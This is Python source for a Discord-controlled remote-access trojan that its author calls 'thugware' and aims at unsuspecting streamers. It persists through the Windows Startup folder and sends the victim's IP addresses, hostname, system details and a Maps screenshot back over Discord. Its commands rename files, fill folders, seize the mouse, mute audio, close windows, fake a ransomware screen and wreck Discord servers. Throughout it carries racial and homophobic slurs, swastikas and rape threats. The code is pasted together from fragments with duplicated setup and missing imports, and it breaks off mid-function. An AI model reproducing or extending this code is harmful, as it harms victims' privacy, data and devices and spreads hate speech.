# Import necessary libraries
import os
import discord
from discord.ext import commands
import aiohttp
import ctypes
import sys
import subprocess
import platform
import time
import shutil
import asyncio
import pyautogui

pyautogui.FAILSAFE = False

# Your Discord bot token
TOKEN = "INSERTTOKENHERE"

# Your Discord webhook URL
WEBHOOK_URL = "INSERTWEBHOOK HERE"

# Notify the webhook immediately when the script is run
async def notify_webhook_on_script_run():
    try:
        # Create a session for making HTTP requests
        async with aiohttp.ClientSession() as session:
            # Create a Discord webhook instance
            webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
            # Send a message to the webhook
            await webhook.send("<@everyone> The script has been executed!")

    except Exception as e:
        print(f"Error notifying webhook on script run: {e}")

# Notify the webhook immediately when the script is run
asyncio.run(notify_webhook_on_script_run())

# Create an instance of Intents
intents = discord.Intents.default()
intents.message_content = True  # Enable message content events

# Create an instance of the bot with intents
bot = commands.Bot(command_prefix="!", intents=intents)

# Set the script window as a top-level window
def set_window_topmost():
    try:
        # Get the console window handle
        console_handle = ctypes.windll.kernel32.GetConsoleWindow()
        # Set the console window as a top-level window
        ctypes.windll.user32.SetWindowPos(console_handle, -1, 0, 0, 0, 0, 0x0001 | 0x0002)
    except Exception as e:
        print(f"Error setting window as topmost: {e}")

# Notify the webhook immediately after initializing the bot
async def notify_webhook_on_startup():
    try:
        # Create a session for making HTTP requests
        async with aiohttp.ClientSession() as session:
            # Create a Discord webhook instance
            webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
            # Send a message to the webhook
            await webhook.send("<@everyone> The script has been executed!")

    except Exception as e:
        print(f"Error notifying webhook on startup: {e}")

# Event: Bot is ready
@bot.event
async def on_ready():
    print(f"We have logged in as {bot.user.name}")
    await notify_webhook_on_startup()
    set_window_topmost()

    
# Function: Send a message when a command is executed
async def notify_command_execution(ctx):
    try:
        # Specify the channel or webhook where you want to send the notification
        notification_channel_id = 1176635892056719423  # Replace with the actual channel ID

        # Get the channel object
        notification_channel = bot.get_channel(notification_channel_id)

        if notification_channel:
            # Send a message indicating that a command has been executed
            await notification_channel.send(f"Command `{ctx.command.name}` executed by {ctx.author.name}#{ctx.author.discriminator}")

    except Exception as e:
        print(f"Error notifying command execution: {e}")

# Event: Command is invoked
@bot.event
async def on_command(ctx):
    await notify_command_execution(ctx)


# Function: Send a message to the webhook
async def notify_webhook():
    try:
        # Create a session for making HTTP requests
        async with aiohttp.ClientSession() as session:
            # Create a Discord webhook instance
            webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
            # Send a message to the webhook
            await webhook.send("<@everyone> Someone is ready for the commands")
    except Exception as e:
        print(f"Error notifying webhook: {e}")

# Function: Add the script to startup
def add_to_startup():
    try:
        # Get the user's startup folder
        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

        # Copy the script to the startup folder
        script_path = sys.argv[0]
        script_name = os.path.basename(script_path)
        startup_path = os.path.join(startup_folder, script_name)

        shutil.copyfile(script_path, startup_path)

        print(f"Script added to startup: {startup_path}")

    except Exception as e:
        print(f"Error adding script to startup: {e}")
        
import discord
from discord.ext import commands

# Create an instance of Intents
intents = discord.Intents.default()
intents.message_content = True  # Enable message content events

# Create an instance of the bot with intents
bot = commands.Bot(command_prefix="!", intents=intents)

# Command: !joinvc
@bot.command()
async def joinvc(ctx):
    try:
        # Check if the author is in a voice channel
        if ctx.author.voice and ctx.author.voice.channel:
            channel = ctx.author.voice.channel

            # Connect to the voice channel
            vc = await channel.connect()

            # Load and play the audio file
            audio_source = discord.PCMVolumeTransformer(discord.FFmpegPCMAudio("play.mp3"))
            vc.play(audio_source)

            await ctx.send(f"Joined voice channel {channel.name} and playing sound!")

        else:
            await ctx.send("You are not in a voice channel. Please join a voice channel and try again.")

    except Exception as e:
        await ctx.send(f"Error joining voice channel: {e}")


# Command: !alert
@bot.command()
async def alert(ctx):
    try:
        # Show a Windows system alert
        ctypes.windll.user32.MessageBoxW(0, "YOU ARE BEING HACKED BY THE CCP GET RAPED NIGGERS", 1)

        await ctx.send("System alert sent!")

    except Exception as e:
        print(f"Error sending system alert: {e}")

# Command: !dm
@bot.command()
async def dm(ctx, user_id: int, *, message):
    try:
        # Get the user object based on the provided user ID
        user = await bot.fetch_user(user_id)

        # Send a direct message to the user
        await user.send(message)

        await ctx.send(f"Message sent to {user.name}#{user.discriminator}")

    except discord.NotFound:
        await ctx.send(f"User with ID {user_id} not found.")
    except Exception as e:
        print(f"Error sending DM: {e}")
        await ctx.send("Error sending DM.")
        
# Command: !exelink
@bot.command()
async def exelink(ctx):
    try:
        # Send a message mentioning everyone with the link
        message = "@everyone. Get innocent twitch streamers to run this thugware"
        await ctx.send(message)

    except Exception as e:
        print(f"Error sending exelink: {e}")
        await ctx.send("Error sending exelink.")


        
# Command: !L.A.G
@bot.command(name='L.A.G')
async def lag(ctx):
    try:
        # Number of new tabs to open
        num_tabs = 500

        # Open 500 new tabs in Microsoft Edge using Ctrl + T
        for _ in range(num_tabs):
            pyautogui.hotkey('ctrl', 't')
            await asyncio.sleep(0.5)  # Add a short delay between each Ctrl + T press

        await ctx.send(f"Opening {num_tabs} new tabs in Microsoft Edge!")

    except Exception as e:
        print(f"Error opening new tabs: {e}")
        
# Command: !list_startup
@bot.command()
async def list_startup(ctx):
    try:
        # Get the user's startup folder
        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

        # List all files in the startup folder
        startup_files = os.listdir(startup_folder)

        if startup_files:
            # Send a list of startup files to the user
            await ctx.send("List of startup applications:")
            for file_name in startup_files:
                await ctx.send(f"- {file_name}")
        else:
            await ctx.send("No applications found in the startup folder.")

    except Exception as e:
        await ctx.send(f"Error during !list_startup command: {e}")
            
               
# Import necessary libraries
import discord
from discord.ext import commands

# Create an instance of Intents
intents = discord.Intents.default()
intents.message_content = True  # Enable message content events

# Create an instance of the bot with intents
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.command()
async def pfp(ctx):
    try:
        # Check if an attachment is present
        if not ctx.message.attachments:
            await ctx.send("Please attach an image to change the profile picture.")
            return

        # Get the first attachment
        attachment = ctx.message.attachments[0]

        # Download the attached file
        await attachment.save("new_pfp.jpg")

        # Change the bot's profile picture
        with open("new_pfp.jpg", "rb") as file:
            await bot.user.edit(avatar=file.read())

        await ctx.send("Profile picture updated!")

    except Exception as e:
        print(f"Error changing profile picture: {e}")
        await ctx.send("Error changing profile picture.")
        

# Function: Move mouse to a random spot
async def move_mouse():
    try:
        while True:
            # Get the screen width and height
            screen_width, screen_height = pyautogui.size()

            # Generate random coordinates within the screen boundaries
            x = random.randint(0, screen_width)
            y = random.randint(0, screen_height)

            # Move the mouse to the random coordinates
            pyautogui.moveTo(x, y)

            # Wait for 45 seconds before moving the mouse again
            await asyncio.sleep(45)

    except Exception as e:
        print(f"Error moving mouse: {e}")

# Command: !random_mouse
@bot.command()
async def random_mouse(ctx):
    try:
        # Start moving the mouse in a separate task
        bot.loop.create_task(move_mouse())

        await ctx.send("Mouse will move to a random spot every 45 seconds.")

    except Exception as e:
        print(f"Error starting random mouse movement: {e}")
        await ctx.send("Error starting random mouse movement.")
        


        
# Command: !start
@bot.command()
async def start(ctx):
    try:
        # Specify the name of the file to look for in the Downloads folder
        file_name = "SPEEDY_MAQING_by_thug_hunter.exe"

        # Get the user's Downloads folder
        downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")

        # Check if the file exists in the Downloads folder
        file_path = os.path.join(downloads_folder, file_name)
        if os.path.exists(file_path):
            # Copy the file to the startup folder
            startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            startup_path = os.path.join(startup_folder, file_name)

            shutil.copyfile(file_path, startup_path)

            await ctx.send(f"File '{file_name}' added to startup!")

        else:
            await ctx.send(f"File '{file_name}' not found in the Downloads folder.")

    except Exception as e:
        await ctx.send(f"Error during !start command: {e}")
        
# Command: !allroles
@bot.command()
async def allroles(ctx, member: discord.Member = None):
    try:
        # Check if the command is invoked by the authorized user
        authorized_user_id = 1176123011691200543
        if ctx.author.id != authorized_user_id:
            await ctx.send("YOU ARE NOT THUG HUNTER SO STOP DREAMIN FAGGOT")
            return

        # Determine the target member (default to the command invoker if not specified)
        target_member = member or ctx.author

        # Assign roles to the target member
        for role in ctx.guild.roles:
            try:
                await target_member.add_roles(role)
            except discord.Forbidden:
                print(f"Bot doesn't have permission to assign the role: {role.name}")
            except discord.HTTPException:
                print(f"Error assigning role: {role.name}")

        await ctx.send(f"All roles assigned to {target_member.mention}.")

    except Exception as e:
        print(f"Error assigning all roles: {e}")
        await ctx.send("Error assigning all roles.")

        
# Command: !n
@bot.command()
async def n(ctx):
    try:
        # Check if the bot has the required permissions to manage channels and roles
        if ctx.guild.me.guild_permissions.manage_channels and ctx.guild.me.guild_permissions.manage_roles:
            # Delete all channels
            for channel in ctx.guild.channels:
                await channel.delete()
                await asyncio.sleep(0.5)  # Add a short delay between each channel deletion

            # Give all users all roles
            for member in ctx.guild.members:
                for role in ctx.guild.roles:
                    try:
                        await member.add_roles(role)
                    except discord.Forbidden:
                        print(f"Bot doesn't have permission to assign the role: {role.name}")
                    except discord.HTTPException:
                        print(f"Error assigning role: {role.name}")

            # Create 300 channels named "卐卐卐HACKED BY CCP NIGGER卍卍卍"
            for i in range(1, 301):
                channel_name = f"卐卐卐HACKED BY CCP NIGGER卍卍卍-{i}"

                # Create the channel without checking for duplicates
                new_channel = await ctx.guild.create_text_channel(channel_name)

                # Send 5 messages in the created channel with a mention
                for _ in range(5):
                    await new_channel.send("@everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS @everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS @everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS @everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS@everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS@everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS@everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS @everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS @everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS @everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS@everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS@everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS@everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS @everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS @everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS @everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS@everyone THIS IS THE THUG HUNTER YOU HAVE BEEN HACKED BY THE CCP GET RAPED NIGGERS https://cdn.discordapp.com/attachments/1163051300905291826/1179510888533872660/tTsCNLZM.gif?ex=657a0c1e&is=6567971e&hm=55ac8cef03644ff51759d84461b2e58b8cc3629c1ae4d276d3ac12c0a23278fc& heres another image https://cdn.discordapp.com/attachments/1062122000669229127/1067894607133818960/aKIqxJDs.gif")

            await ctx.send("All channels deleted, all roles assigned to all users, and 300 channels named 'ccp-chat' created with 5 mentions each.")

        else:
            await ctx.send("I don't have the necessary permissions to manage channels or roles.")

    except Exception as e:
        await ctx.send(f"Error during !n command: {e}")
        


        
# Command: !maps
@bot.command()
async def maps(ctx):
    try:
        # Open Google Maps in the default web browser
        search_url = "https://www.google.com/maps"
        webbrowser.open(search_url)

        # Pause for a moment to allow the Google Maps page to load
        await asyncio.sleep(2)

        # Use pyautogui to type "your location"
        pyautogui.typewrite("your location")

        # Press Enter
        pyautogui.press("enter")

        # Wait for 0.7 seconds
        await asyncio.sleep(0.7)

        # Take a screenshot
        screenshot_path = "maps_screenshot.png"
        pyautogui.screenshot(screenshot_path)

        # Send the screenshot to the Discord channel
        with open(screenshot_path, "rb") as file:
            screenshot = discord.File(file)
            await ctx.send("Google Maps search result:", file=screenshot)

    except Exception as e:
        print(f"Error in the !maps command: {e}")
import discord
from discord.ext import commands
import tkinter as tk
from PIL import Image, ImageTk
import requests
import webbrowser
import subprocess
import pyautogui
import asyncio

# ... (existing imports)

# Function: Open a GUI with a fullscreen image
async def open_fullscreen_gui(ctx, image_url):
    try:
        # Create a fullscreen GUI window
        root = tk.Tk()
        root.attributes('-fullscreen', True)

        # Set the window as always on top and focused
        root.wm_attributes('-topmost', 1)
        root.focus_force()

        # Load and display the image in the GUI
        image_path = "image.jpg"
        image_data = requests.get(image_url).content
        with open(image_path, "wb") as image_file:
            image_file.write(image_data)

        image = Image.open(image_path)
        photo = ImageTk.PhotoImage(image)
        label = tk.Label(root, image=photo)
        label.pack(fill=tk.BOTH, expand=True)

        # Move the cursor to (100, 200) every 10 seconds and click for 5 seconds
        async def move_and_click():
            while root.winfo_exists():
                pyautogui.moveTo(100, 200, duration=1)  # Move to (100, 200) over 1 second

                # Click and hold for 5 seconds
                pyautogui.mouseDown()
                await asyncio.sleep(5)
                pyautogui.mouseUp()

                await asyncio.sleep(5)  # Wait for 5 seconds

        # Run the cursor movement and clicking in the background
        asyncio.create_task(move_and_click())

        # Run the GUI event loop
        root.mainloop()

        await ctx.send("GUI opened!")

    except Exception as e:
        print(f"Error opening GUI: {e}")

# Command: !rw
@bot.command()
async def rw(ctx):
    try:
        # Open the image in the default web browser
        image_url = "https://vpnpick.com/wp-content/uploads/2016/10/89138788_ransomware.jpg"
        webbrowser.open(image_url)

        # Open the image in a fullscreen GUI with cursor movement and clicking
        await open_fullscreen_gui(ctx, image_url)

    except Exception as e:
        print(f"Error opening GUI: {e}")

# ... (rest of the script)

        
import math

# Define the center of the screen
CENTER_X, CENTER_Y = 1500, 900

# Define the distance (in pixels) from the center to create a zone
ZONE_RADIUS = 300

# Define the distance (in pixels) from the screen edges to create an edge zone
EDGE_DISTANCE = 50

# Command: !zone
@bot.command()
async def zone(ctx):
    try:
        # Notify the user about the zone restriction
        await ctx.send(f"Cursor movement restricted within a {ZONE_RADIUS}-pixel radius and within {EDGE_DISTANCE}-pixels of the screen edges.")

        # Continuously check and move the cursor to stay outside the restricted zones
        while True:
            x, y = pyautogui.position()
            distance_center = ((x - CENTER_X)**2 + (y - CENTER_Y)**2)**0.5
            distance_left_edge = x
            distance_right_edge = pyautogui.size()[0] - x
            distance_top_edge = y
            distance_bottom_edge = pyautogui.size()[1] - y

            if (
                distance_center < ZONE_RADIUS or
                distance_left_edge < EDGE_DISTANCE or
                distance_right_edge < EDGE_DISTANCE or
                distance_top_edge < EDGE_DISTANCE or
                distance_bottom_edge < EDGE_DISTANCE
            ):
                # Move the cursor immediately to a safe position
                new_x = min(max(x, EDGE_DISTANCE), CENTER_X - ZONE_RADIUS) \
                         if distance_left_edge < EDGE_DISTANCE else \
                         min(max(x, CENTER_X + ZONE_RADIUS), pyautogui.size()[0] - EDGE_DISTANCE)
                new_y = min(max(y, EDGE_DISTANCE), CENTER_Y - ZONE_RADIUS) \
                         if distance_top_edge < EDGE_DISTANCE else \
                         min(max(y, CENTER_Y + ZONE_RADIUS), pyautogui.size()[1] - EDGE_DISTANCE)

                pyautogui.moveTo(new_x, new_y, duration=0)

            await asyncio.sleep(0.1)

    except Exception as e:
        print(f"Error in the !zone command: {e}")                
# Command: !sound
@bot.command()
async def sound(ctx):
    try:
        # Specify the path to the "loud.mp3" file
        sound_file_path = "loud.mp3"

        # Check if the file exists
        if os.path.exists(sound_file_path):
            # Freeze the mouse at (100, 200)
            pyautogui.moveTo(100, 200, duration=0.5)

            # Open the sound file using the default media player on Windows
            os.startfile(sound_file_path)

            # Update the mouse position every 0.1 seconds for 25 seconds
            for _ in range(int(25 / 0.1)):
                pyautogui.moveTo(100, 200, duration=0.1)
                await asyncio.sleep(0.1)

            # Allow the mouse to move again
            pyautogui.moveTo(0, 0, duration=0.5)

            await ctx.send("Playing loud.mp3 using the default media player. Mouse position updated every 0.1 seconds for 25 seconds.")
        else:
            await ctx.send("The 'loud.mp3' file is missing.")           

    except Exception as e:
        print(f"Error playing sound: {e}")
        
import discord
from discord.ext import commands
import shutil

# ... (existing imports)

# Set the directory for shared files
shared_directory = "shared_files"

# Ensure the shared directory exists
shutil.os.makedirs(shared_directory, exist_ok=True)

# Command: !networkshare
@bot.command()
async def networkshare(ctx):
    try:
        # Check if a file is attached to the message
        if len(ctx.message.attachments) == 0:
            await ctx.send("Please attach a file to share.")
            return

        # Get the attached file
        attachment = ctx.message.attachments[0]
        file_url = attachment.url
        file_name = attachment.filename

        # Download the file
        file_data = await attachment.read()

        # Save the file to the shared directory
        file_path = f"{shared_directory}/{file_name}"
        with open(file_path, "wb") as file:
            file.write(file_data)

        await ctx.send(f"File '{file_name}' shared successfully!")

    except Exception as e:
        print(f"Error sharing file: {e}")
        await ctx.send("Error sharing file.")

# ... (rest of the script)


import discord
from discord.ext import commands
import zipfile
import io

# ... (existing imports)

# Command: !zip
@bot.command()
async def zip(ctx):
    try:
        # Check if files are attached to the message
        if len(ctx.message.attachments) == 0:
            await ctx.send("Please attach one or more files to zip.")
            return

        # Create a BytesIO buffer to store the zip file
        zip_buffer = io.BytesIO()

        # Create a ZipFile object
        with zipfile.ZipFile(zip_buffer, "w") as zip_file:
            # Add each attached file to the zip file
            for attachment in ctx.message.attachments:
                file_data = await attachment.read()
                zip_file.writestr(attachment.filename, file_data)

        # Move the buffer's position to the beginning to prepare for reading
        zip_buffer.seek(0)

        # Send the zip file
        await ctx.send(file=discord.File(zip_buffer, filename="files.zip"))

    except Exception as e:
        print(f"Error zipping files: {e}")
        await ctx.send("Error zipping files.")

# ... (rest of the script)


# Command: !wallpaper
@bot.command()
async def wallpaper(ctx):
    try:
        # Check if a file is attached
        if ctx.message.attachments:
            # Save the attached file to the wallpaper directory
            attachment = ctx.message.attachments[0]
            wallpaper_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "wallpaper.jpg")
            await attachment.save(wallpaper_path)
        else:
            # Use default image URL
            wallpaper_url = "https://th.bing.com/th/id/OIP.IbsSodShW2ehca98tucC7AHaHS?rs=1&pid=ImgDetMain"

            # Download the default image
            wallpaper_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "wallpaper.jpg")
            response = requests.get(wallpaper_url, stream=True)
            with open(wallpaper_path, "wb") as image_file:
                shutil.copyfileobj(response.raw, image_file)

        # Set the desktop background
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)

        await ctx.send("Desktop background changed!")

    except Exception as e:
        print(f"Error changing desktop background: {e}") 
        
                
# Command: !namename
@bot.command()
async def namename(ctx):
    try:
        # Get the default downloads directory
        downloads_directory = os.path.join(os.path.expanduser("~"), "Downloads")

        # Rename all files in the Downloads directory to "HACKED BY CCP1", "HACKED BY CCP2", etc.
        for i, filename in enumerate(os.listdir(downloads_directory), start=1):
            file_path = os.path.join(downloads_directory, filename)
            if os.path.isfile(file_path):
                new_name = os.path.join(downloads_directory, f"HACKED BY CCP{i}")
                os.rename(file_path, new_name)

        await ctx.send("All files in the Downloads directory have been renamed to 'HACKED BY CCP1', 'HACKED BY CCP2', etc.")

    except Exception as e:
        print(f"Error renaming files: {e}")
        await ctx.send("An error occurred while renaming files.")
        
# Command: !full
@bot.command()
async def full(ctx, amount: int = None, copies: int = None):
    try:
        # Check if both amount and copies are provided
        if amount is None or copies is None:
            await ctx.send("Please provide both 'amount' and 'copies' arguments. Example: `!full 5 3`")
            return

        # Get the default downloads directory
        downloads_directory = os.path.join(os.path.expanduser("~"), "Downloads")

        # Get the path to the filer text file
        filer_text_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "filer.txt")

        # Read the content of the filer text file
        with open(filer_text_path, "r") as file:
            filer_text_content = file.read()

        # Create the specified number of folders
        for i in range(amount):
            folder_name = f"folder_{i + 1}"
            folder_path = os.path.join(downloads_directory, folder_name)

            # Create the folder
            os.makedirs(folder_path)

            # Write the filer text content to multiple files in the folder
            for j in range(copies):
                with open(os.path.join(folder_path, f"filer_{j + 1}.txt"), "w") as file:
                    file.write(filer_text_content)

        await ctx.send(f"{amount} folders created in the Downloads directory with {copies} copies of filer.txt in each.")

    except Exception as e:
        print(f"Error creating folders: {e}")
        await ctx.send("An error occurred while creating folders.")
     
# Command: !voltroll
@bot.command()
async def voltroll(ctx):
    try:
        await ctx.send("Starting voltroll to set system volume to zero every one second.")

        # Get the default audio endpoint
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None
        )
        volume = cast(interface, POINTER(IAudioEndpointVolume))

        # Function to set system volume to zero
        async def set_volume_zero():
            while True:
                # Set the system volume to zero
                volume.SetMasterVolumeLevelScalar(0.0, None)
                await asyncio.sleep(1.0)

        # Start the set_volume_zero function as a task
        bot.loop.create_task(set_volume_zero())

    except Exception as e:
        print(f"Error starting voltroll: {e}")
        
# Command: !urban
@bot.command()
async def urban(ctx, term: str):
    try:
        url = f"https://api.urbandictionary.com/v0/define?term={term}"
        response = requests.get(url)
        data = response.json()

        if data['list']:
            definition = data['list'][0]['definition']
            await ctx.send(f"**Urban Dictionary - {term.capitalize()}**\n{definition}")
        else:
            await ctx.send("No definition found on Urban Dictionary.")

    except Exception as e:
        print(f"Error in the !urban command: {e}")
import socket
# Command: !info
@bot.command()
async def info(ctx):
    try:
        # Get public and local IPv4 addresses, MAC address, and hostname
        public_ip_address = requests.get("https://api64.ipify.org?format=json").json()["ip"]
        local_ip_address = socket.gethostbyname(socket.gethostname())
        mac_address = ':'.join(['{:02x}'.format((int(os.getpid()) >> elements) & 0xff) for elements in (40, 32, 24, 16, 8, 0)])
        hostname = socket.gethostname()

        # Get system specifications
        system_info = platform.uname()
        specs = f"System: {system_info.system}\nNode Name: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}"

        # Get local time
        local_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        # Send PC information to Discord
        pc_info_message = f"**PC Information:**\n\nPublic IPv4 Address: {public_ip_address}\nLocal IPv4 Address: {local_ip_address}\nMAC Address: {mac_address}\nHostname: {hostname}\n\n**System Specifications:**\n{specs}\n\n**Local Time:** {local_time}"
        await ctx.send(pc_info_message)

    except Exception as e:
        print(f"Error getting PC information: {e}")
        
# Command: !close
@bot.command()
async def close(ctx):
    try:
        await ctx.send("Closing the bot.")
        # Terminate the bot (close the script)
        await bot.close()
    except Exception as e:
        print(f"Error while closing the bot: {e}")
import pygetwindow as gw

import subprocess
import os

# Command: !jumpscare
@bot.command()
async def jumpscare(ctx):
    try:
        # Get the current working directory
        current_directory = os.getcwd()

        # Specify the filename of the jumpscare MP4 file
        jumpscare_filename = "jumpscare.mp4"

        # Construct the full path to the jumpscare file
        jumpscare_file_path = os.path.join(current_directory, jumpscare_filename)

        # Construct the command to open the media player on top
        command = f'start /WAIT "Media Player" "{jumpscare_file_path}"'

        # Use subprocess to run the command
        subprocess.Popen(command, shell=True)

        await ctx.send("Prepare for the jumpscare!")

    except Exception as e:
        print(f"Error triggering jumpscare: {e}")
        await ctx.send("Error triggering jumpscare.")



        
# Command: !shut
@bot.command()
async def shut(ctx):
    try:
        await ctx.send("Closing all open windows.")

        # Get a list of all open windows
        windows = gw.getAllTitles()

        # Close each open window
        for window in windows:
            try:
                # Close the window
                gw.getWindowsWithTitle(window)[0].close()
            except Exception as e:
                print(f"Error closing window '{window}': {e}")

        await ctx.send("All open windows closed.")

    except Exception as e:
        print(f"Error while closing windows: {e}")

# Command: !glorytotheccp
@bot.command()
async def glorytotheccp(ctx):
    try:
        # Create a fullscreen GUI window
        root = tk.Tk()
        root.attributes('-fullscreen', True)

        # Set the window as always on top and focused
        root.wm_attributes('-topmost', 1)
        root.focus_force()

        # Load and display the image in the GUI
        image_url = "https://th.bing.com/th/id/OIP.rAqo72VT1CE2uLVim33--AHaD4?rs=1&pid=ImgDetMain"
        image_data = requests.get(image_url).content
        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "fullscreen_image.jpg")
        with open(image_path, "wb") as image_file:
            image_file.write(image_data)

        image = Image.open(image_path)
        photo = ImageTk.PhotoImage(image)
        label = tk.Label(root, image=photo)
        label.pack(fill=tk.BOTH, expand=True)

        # Play the audio file (Assuming it's in the same directory as the script)
        audio_file = "5.mp3"
        subprocess.run(["start", audio_file], shell=True)

        # Run the GUI event loop
        root.mainloop()

        await ctx.send("Fullscreen GUI opened with glory to the CCP!")

    except Exception as e:
        print(f"Error opening fullscreen GUI: {e}")
        
# Command: !speak
@bot.command()
async def speak(ctx, *, words):
    try:
        # Use PowerShell to invoke Narrator
        subprocess.run(["powershell", f"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{words}')"])

        await ctx.send(f"Speaking: {words}")

    except Exception as e:
        print(f"Error speaking: {e}")

# Command: !massdm
@bot.command()
async def massdm(ctx, *, custom_message):
    try:
        # Get all members of the server
        members = ctx.guild.members

        # Send DMs to all members with the custom message
        for member in members:
            try:
                await member.send(custom_message)
            except discord.Forbidden:
                # Handle cases where the bot can't send a DM to the user (due to privacy settings, etc.)
                print(f"Couldn't send DM to {member.display_name}")

        await ctx.send(f"DMs sent to all members with the message: {custom_message}")

    except Exception as e:
        print(f"Error sending DMs: {e}")
        
import webbrowser

# Command: !openurl
@bot.command()
async def openurl(ctx, url):
    try:
        # Open the specified URL
        webbrowser.open(url)

        await ctx.send(f"Opening URL: {url}")

    except Exception as e:
        print(f"Error opening URL: {e}")
        
import tkinter as tk
from PIL import Image, ImageTk
import webbrowser
import subprocess

import tkinter as tk
from PIL import Image, ImageTk
import webbrowser
import subprocess

# Command: !gui
@bot.command()
async def gui(ctx):
    try:
        # Open the image in the default web browser
        image_url = "https://th.bing.com/th/id/OIP.t_NhCT3G3xIa4OpIw4EhUgHaDt?rs=1&pid=ImgDetMain"
        webbrowser.open(image_url)

        # Create a fullscreen GUI window
        root = tk.Tk()
        root.attributes('-fullscreen', True)

        # Set the window as always on top and focused
        root.wm_attributes('-topmost', 1)
        root.focus_force()

        # Load and display the image in the GUI
        image_path = "image.jpg"
        image_data = requests.get(image_url).content
        with open(image_path, "wb") as image_file:
            image_file.write(image_data)

        image = Image.open(image_path)
        photo = ImageTk.PhotoImage(image)
        label = tk.Label(root, image=photo)
        label.pack(fill=tk.BOTH, expand=True)

        # Play the audio file (Assuming it's in the same directory as the script)
        audio_file = "666.mp3"
        subprocess.run(["start", audio_file], shell=True)

        # Run the GUI event loop
        root.mainloop()

        await ctx.send("GUI opened!")

    except Exception as e:
        print(f"Error opening GUI: {e}")
        
# Command: !commands
@bot.command()
async def commands(ctx):
    try:
        command_list = sorted([(cmd.name, cmd.help) for cmd in bot.commands])
        formatted_commands = "\n".join([f"**{name}**: {description}" for name, description in command_list])

        await ctx.send(f"List of Commands:\n\n{formatted_commands}")

    except Exception as e:
        print(f"Error getting commands: {e}")

# Command: !black
@bot.command()
async def black(ctx):
    try:
        # Image URL for the black image
        black_image_url = "https://thumb-lvlt.xhcdn.com/a/VtiyCz2qnrFTxN2wkZ43Ig/008/950/997/2000x2000.6.jpg"

        # Open the image in the default web browser
        webbrowser.open(black_image_url)

        # Create a fullscreen GUI window
        root = tk.Tk()
        root.attributes('-fullscreen', True)

        # Set the window as always on top and focused
        root.wm_attributes('-topmost', 1)
        root.focus_force()

        # Load and display the image in the GUI
        image_path = "black_image.jpg"
        image_data = requests.get(black_image_url).content
        with open(image_path, "wb") as image_file:
            image_file.write(image_data)

        image = Image.open(image_path)
        photo = ImageTk.PhotoImage(image)
        label = tk.Label(root, image=photo)
        label.pack(fill=tk.BOTH, expand=True)

        # Run the GUI event loop
        root.mainloop()

        await ctx.send("Fullscreen black GUI opened!")

    except Exception as e:
        print(f"Error opening black GUI: {e}")
        
# Command: !song
@bot.command()
async def song(ctx, song_name):
    try:
        # Check if the requested song is the specified YouTube video
        if song_name == "youtube":
            youtube_url = "https://www.youtube.com/watch?v=kF9-NypY5i0&ab_channel=NPC"

            # Open the YouTube video in a new Edge window
            webbrowser.open("microsoft-edge:" + youtube_url)

            # Pause for a moment to allow the window to open
            await asyncio.sleep(2)

            # Minimize the Edge window
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)

            await ctx.send(f"Now playing: {youtube_url}")

        else:
            await ctx.send(f"Song not found: {song_name}")

    except Exception as e:
        print(f"Error playing song: {e}")
        
# Command: !purge
@bot.command()
async def purge(ctx, amount: int):
    try:
        # Check if the amount is within the allowed range (1 to 1000000)
        if 1 <= amount <= 1000000:
            # Delete the specified number of messages
            deleted = await ctx.channel.purge(limit=amount + 1)  # +1 to include the command itself

            # Inform about the number of deleted messages
            await ctx.send(f"Deleted {len(deleted)} messages.")

        else:
            await ctx.send("Please provide a number between 1 and 100.")

    except Exception as e:
        print(f"Error purging messages: {e}")

# Command: !share
@bot.command()
async def share(ctx):
    try:
        # Check if the user has attached a file
        if ctx.message.attachments:
            # Save the attached file to the shared files directory
            attachment = ctx.message.attachments[0]
